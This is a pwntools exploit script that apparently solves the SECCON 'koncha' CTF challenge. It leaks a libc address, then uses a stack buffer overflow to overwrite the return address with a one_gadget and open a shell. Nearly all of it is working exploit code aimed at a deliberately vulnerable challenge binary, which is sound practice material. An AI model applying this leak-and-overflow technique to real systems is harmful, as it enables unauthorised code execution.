#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bin/chall
from pwn import *

# Set up pwntools for the correct architecture
context.terminal = ["tmux", "splitw", "-h"]
exe = context.binary = ELF('bin/chall')
libc = ELF('lib/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("koncha.seccon.games", 9001)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
one_gadget = 0xe3b01 
offset = 0x1f12e8

# send empty payload in order to not overwrite the libc address
name_payload =  b""
io.sendlineafter(b"name?", name_payload)
io.recvuntil(b"you, ")
# get the leak
leak = u64(io.recvuntil(b"!", drop=True).strip().ljust(8, b"\x00")) 
libc.address = leak - offset
log.success(f"libc @ {hex(libc.address)}")
# send the paylaod to overwrite the return address with one gadget
country_payload =  b""
country_payload += cyclic(0x58)
country_payload += p64(libc.address + one_gadget) 
io.sendlineafter(b"in?", country_payload)

io.interactive()

